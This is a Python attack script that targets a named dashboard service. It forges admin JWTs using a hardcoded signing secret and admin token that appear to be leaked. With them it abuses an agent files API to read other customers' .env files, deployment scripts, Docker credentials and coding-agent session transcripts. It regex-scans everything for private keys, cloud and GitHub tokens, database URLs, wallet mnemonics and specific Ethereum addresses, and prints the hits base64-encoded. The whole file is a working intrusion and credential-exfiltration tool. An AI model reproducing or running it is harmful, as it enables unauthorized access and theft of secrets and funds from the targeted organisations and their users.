#!/usr/bin/env python3
# i29240: dashboard files-RPC targeted read of project-level deployment files
#  (a) goldenyears agent-8c6ac8b3: lumii-assistant/.env.dev (TOP), lumii-work-ops deploy/*,
#      .gstack/browse-audit.jsonl
#  (b) plexus agent-768c13da: .codex-sessions transcripts (sample by mtime) + .docker/config.json
# Read-only; grep for secrets; emit R:<key>:<b64> lines.
import os, sys, json, time, base64, hmac, hashlib, subprocess, re
import urllib.parse as up

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
T0 = time.time()
def el(): return int(time.time() - T0)
def _b64(s): return base64.b64encode(s.encode("utf-8", "replace")).decode()
OUTBUDGET = [2400000]
def R(k, v):
    s = v if isinstance(v, str) else json.dumps(v, ensure_ascii=False, default=str)
    OUTBUDGET[0] -= len(s)
    if OUTBUDGET[0] < 0:
        print("R:__BUDGET__:%s" % _b64("output budget exceeded at key %s" % k), flush=True)
        return
    print("R:%s:%s" % (k, _b64(s)), flush=True)

def curl(args, timeout=30):
    try:
        r = subprocess.run(["curl", "-s", "-k", "-m", str(timeout)] + args, capture_output=True, timeout=timeout + 15)
        return r.returncode, r.stdout, r.stderr
    except Exception as e:
        return -1, b"", repr(e).encode()

def call(path, token=None, bearer=None, timeout=25, maxlen=900000):
    url = "https://%s%s" % (HOST, path)
    args = ["--http2", "-A", UA, "-H", "Accept: application/json, text/plain, */*", "-w", "\n__CODE__%{http_code}"]
    if token: args += ["-H", "Cookie: session=" + token]
    if bearer: args += ["-H", "Authorization: Bearer " + bearer]
    args += [url]
    rc, out, err = curl(args, timeout=timeout)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i+8:].strip()[:3]; txt = txt[:i]
    return {"code": code, "body": txt[:maxlen], "len": len(txt), "rc": rc}

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def forge(payload):
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    p = b64u(json.dumps(payload, separators=(",", ":")))
    sig = b64u(hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    return h + "." + p + "." + sig

def tok_for(uid, customer="aro"):
    return forge({"userId": uid, "email": "probe@x", "customer": customer, "role": "admin"})

def jload(s):
    try: return json.loads(s)
    except Exception: return None

def qp(p): return up.quote(p, safe="/")

def content_of(body):
    j = jload(body)
    if isinstance(j, dict):
        for k in ("content", "text", "data", "body"):
            if isinstance(j.get(k), str):
                return j[k]
        return None
    return body

def lst(aid, path, tok):
    r = call("/api/agents/%s/files?action=list&path=%s" % (aid, qp(path)), token=tok)
    j = jload(r["body"])
    ents = j.get("entries") if isinstance(j, dict) and isinstance(j.get("entries"), list) else []
    return r["code"], ents, r["body"][:200]

def rd(aid, path, tok):
    r = call("/api/agents/%s/files?action=read&path=%s" % (aid, qp(path)), token=tok, maxlen=900000)
    c = content_of(r["body"]) if r["code"] == "200" else None
    return r["code"], c, r["len"], r["body"][:220]

PATTERNS = [
 ("0x64", re.compile(r'\b0x[0-9a-fA-F]{64}\b')),
 ("JWT", re.compile(r'(?i)jwt[_\-]?secret\s*[:=]\s*\S{6,}|JWT_SECRET\s*[:=]\s*\S{6,}')),
 ("DSN", re.compile(r'(?i)(postgres(?:ql)?://[^\s"\'<>]+|mysql://[^\s"\'<>]+|redis://[^\s"\'<>]+|mongodb(?:\+srv)?://[^\s"\'<>]+)')),
 ("CLOUD", re.compile(r'(AKID[A-Za-z0-9]{26,}|LTAI[A-Za-z0-9]{12,}|AKIA[0-9A-Z]{16}|dckr_pat_[A-Za-z0-9_\-]{20,}|ASIA[0-9A-Z]{16})')),
 ("PEM", re.compile(r'-----BEGIN [A-Z ]*PRIVATE KEY-----')),
 ("GHTOK", re.compile(r'(gh[pousr]_[A-Za-z0-9]{30,}|github_pat_[A-Za-z0-9_]{40,}|glpat-[A-Za-z0-9_\-]{16,})')),
 ("ZOO", re.compile(r'(?i)(zoofi[\-_]?index|wand-index|api\.zoofi\.io|trycloudflare\.com|cloudflared|cf[\-_]tunnel|argotunnel\.com)')),
 ("HMAC", re.compile(r'(?i)(x-hub-signature(-256)?|hmac[\w\-]*\s*[:=]\s*\S{8,}|webhook[\w\-]*\s*[:=]\s*\S{8,}|WH_SECRET|signature[\w\-]*\s*[:=]\s*\S{12,})')),
 ("CRYPT", re.compile(r'(?i)(mnemonic|cipherparams|"crypto"\s*:\s*\{|"scrypt"|kdfparams)')),
 ("SECRETKV", re.compile(r'(?i)([A-Za-z0-9_\-]*(secret|passw|passwd|token|apikey|api[_-]?key|access[_-]?key|private[_-]?key)[A-Za-z0-9_\-]*\s*[:=]\s*["\']?[A-Za-z0-9_\-\/+=\.!@#$%^&*]{12,})')),
]
TARGET_EOA = ["c56f7063fd6d199ccc443dbbf4283be602d46343", "fe18aa1efa652660f36ab84f122cd36108f903b6"]

def scan_text(txt, cap=16, lincap=2500):
    res = {}
    if not txt: return res
    lines = txt.splitlines()
    if len(lines) > 60000: lines = lines[:60000]
    for tag, rx in PATTERNS:
        hits = []; seen = set()
        for ln in lines:
            if len(ln) > lincap: ln = ln[:lincap]
            for m in rx.finditer(ln):
                s = m.group(0)[:300]
                if s in seen: continue
                seen.add(s); hits.append(s)
                if len(hits) >= cap: break
            if len(hits) >= cap: break
        if hits: res[tag] = hits
    for h in res.get("0x64", []):
        low = h.lower()[2:]
        if low in TARGET_EOA:
            res.setdefault("TARGET_EOA_HIT", []).append(h)
    return res

def read_and_grep(aid, path, tok, tag, full_if_small=8000, head_instead=None):
    code, c, ln, snip = rd(aid, path, tok)
    if code != "200":
        R(tag, {"p": path, "code": code, "snip": snip}); return None
    if c is None:
        R(tag, {"p": path, "code": "200-nocontent", "raw": snip}); return None
    m = scan_text(c)
    rec = {"p": path, "code": code, "len": len(c)}
    if m: rec["matches"] = m
    if len(c) <= full_if_small:
        rec["text"] = c
    else:
        if head_instead:
            rec["head"] = c[:head_instead]
    R(tag, rec)
    return c

def main():
    R("health", call("/api/health", maxlen=2000))
    # --- (a) goldenyears agent-8c6ac8b3
    aidC = "agent-8c6ac8b3"; uidC = "bc09d9cc-63b0-11f1-ac43-525400595be1"
    tokC = tok_for(uidC, "goldenyears")
    R("C_me", call("/api/auth/me", token=tokC, maxlen=1500))
    # top priority .env.dev
    read_and_grep(aidC, "/home/lumii/lumii-assistant/.env.dev", tokC, "C_ENVDEV", full_if_small=20000)
    read_and_grep(aidC, "/home/lumii/lumii-assistant/.env.dev.example", tokC, "C_ENVDEV_EX", full_if_small=20000)
    # lumii-work-ops deployment files
    for p, tag in [
        ("/home/lumii/lumii-work-ops/deploy/lumii-ops.env.example", "C_WO_ENVEX"),
        ("/home/lumii/lumii-work-ops/deploy/install.sh", "C_WO_INSTALL"),
        ("/home/lumii/lumii-work-ops/agent/deploy/lumii-ops-agent.env.example", "C_WO_AGENVEX"),
        ("/home/lumii/lumii-work-ops/deploy/Caddyfile.example", "C_WO_CADDY"),
        ("/home/lumii/lumii-work-ops/DEPLOY.md", "C_WO_DEPLOYMD"),
    ]:
        read_and_grep(aidC, p, tokC, tag, full_if_small=15000)
    # list workops deploy dir to catch other *.sh / *.env*
    code, ents, snip = lst(aidC, "/home/lumii/lumii-work-ops/deploy", tokC)
    R("C_WO_DEPLOY_LIST", {"code": code, "n": len(ents), "snip": snip,
                           "files": [{"name": e.get("name"), "size": e.get("size")} for e in ents]})
    for e in ents:
        nm = str(e.get("name") or "")
        if re.search(r'(?i)(\.sh$|\.env|\.service$|\.yml$|\.yaml$)', nm) and nm not in (
                "install.sh", "lumii-ops.env.example", "Caddyfile.example"):
            read_and_grep(aidC, "/home/lumii/lumii-work-ops/deploy/" + nm, tokC, "C_WO_" + re.sub(r'[^A-Za-z0-9]', '_', nm)[:24], full_if_small=20000)
    # .gstack/browse-audit.jsonl (large -> matches + head)
    read_and_grep(aidC, "/home/lumii/lumii-assistant/.gstack/browse-audit.jsonl", tokC, "C_AUDIT", full_if_small=0, head_instead=4000)

    # --- (b) plexus agent-768c13da
    aidB = "agent-768c13da"; uidB = "cef8ec22-4906-11f1-ac43-525400595be1"
    tokB = tok_for(uidB, "plexus")
    # .docker
    code, ents, snip = lst(aidB, "/home/lumii/.docker", tokB)
    R("B_DOCKER_LIST", {"code": code, "n": len(ents), "snip": snip,
                        "files": [{"name": e.get("name"), "type": e.get("type")} for e in ents]})
    for e in ents:
        if str(e.get("name")) == "config.json":
            read_and_grep(aidB, "/home/lumii/.docker/config.json", tokB, "B_DOCKERCFG", full_if_small=8000)
    # gather codex-sessions files recursively (year/month/day/file), sort by mtime desc, read top N
    allfiles = []
    rootB = "/home/lumii/.codex-sessions"
    queue = [(rootB, 0)]
    seen = set()
    listcalls = 0
    while queue:
        cur, d = queue.pop(0)
        if cur in seen: continue
        seen.add(cur)
        if el() > 260 or listcalls > 220:
            R("B_CODEX_WALK_CAP", {"listcalls": listcalls, "collected": len(allfiles), "elapsed": el()}); break
        code, ents, snip = lst(aidB, cur, tokB)
        listcalls += 1
        if d == 0:
            R("B_CODEX_ROOT", {"code": code, "n": len(ents), "snip": snip[:160],
                               "dirs": [e.get("name") for e in ents if str(e.get("type")) in ("directory", "dir")]})
        if code != "200":
            continue
        for e in ents:
            nm = str(e.get("name") or "")
            tp = str(e.get("type") or "")
            p = cur.rstrip("/") + "/" + nm
            if tp in ("directory", "dir"):
                if d + 1 <= 6:
                    queue.append((p, d + 1))
            else:
                allfiles.append({"p": p, "size": e.get("size"), "modified": e.get("modified")})
    allfiles.sort(key=lambda x: str(x.get("modified") or ""), reverse=True)
    R("B_CODEX_COUNT", {"total": len(allfiles), "listcalls": listcalls,
                        "newest": [{"p": x["p"], "size": x["size"], "modified": x["modified"]} for x in allfiles[:8]]})
    # read newest N (configurable), grep only
    N = int(os.environ.get("CODEX_N", "45"))
    hits_total = []
    for x in allfiles[:N]:
        code, c, ln, snip2 = rd(aidB, x["p"], tokB)
        if code != "200" or c is None:
            continue
        m = scan_text(c)
        if m:
            hits_total.append({"p": os.path.basename(x["p"]), "modified": x.get("modified"), "matches": m})
            # emit each hit transcript excerpt (bounded around matches not easy; emit head + matches keys)
    R("B_CODEX_HITS", {"scanned": min(N, len(allfiles)), "nfiles_with_hits": len(hits_total), "items": hits_total[:60]})

    R("DONE", {"elapsed": el(), "outbudget_left": OUTBUDGET[0]})

try:
    main()
except Exception:
    import traceback
    R("FATAL", traceback.format_exc()[-3000:])
finally:
    R("END", {"elapsed": el()})
    sys.exit(1)
